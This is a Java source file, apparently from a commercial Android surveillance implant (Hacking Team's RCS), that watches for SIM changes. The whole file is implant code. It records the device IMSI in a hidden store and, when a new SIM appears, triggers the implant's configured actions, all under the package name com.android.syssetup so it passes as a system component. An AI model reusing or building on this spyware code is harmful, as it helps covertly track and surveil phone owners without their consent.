/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventSim.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.event;

import com.android.syssetup.Device;
import com.android.syssetup.Sim;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfEvent;
import com.android.syssetup.evidence.Markup;
import com.android.syssetup.interfaces.Observer;
import com.android.syssetup.listener.ListenerSim;
import com.android.syssetup.util.Check;

import java.io.IOException;

public class EventSim extends BaseEvent implements Observer<Sim> {
	/**
	 * The Constant TAG.
	 */
	private static final String TAG = "EventSim"; //$NON-NLS-1$

	private int actionOnEnter;

	@Override
	public void actualStart() {
		ListenerSim.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerSim.self().detach(this);
	}

	@Override
	public boolean parse(ConfEvent conf) {
		return true;
	}

	@Override
	public void actualGo() {
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Sim s) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Got SIM status notification: " + s.getImsi());//$NON-NLS-1$
		}

		// Verifichiamo la presenza della SIM
		if (s.getImsi().length() == 0) {
			return 0;
		}

		Markup storedImsi = new Markup(this);

		// Vediamo se gia' c'e' un markup
		if (storedImsi.isMarkup() == true) {
			try {
				final byte[] actual = storedImsi.readMarkup();
				final String storedValue = new String(actual);

				if (storedValue.contentEquals(s.getImsi()) == false) {
					// Aggiorniamo il markup
					final byte[] value = s.getImsi().getBytes();
					storedImsi.writeMarkup(value);

					onEnter();
					onExit();
				}
			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
			}
		} else {
			final String imsi = Device.self().getImsi();

			final byte[] value = imsi.getBytes();

			storedImsi.writeMarkup(value);
		}

		storedImsi = null;
		return 0;
	}

}
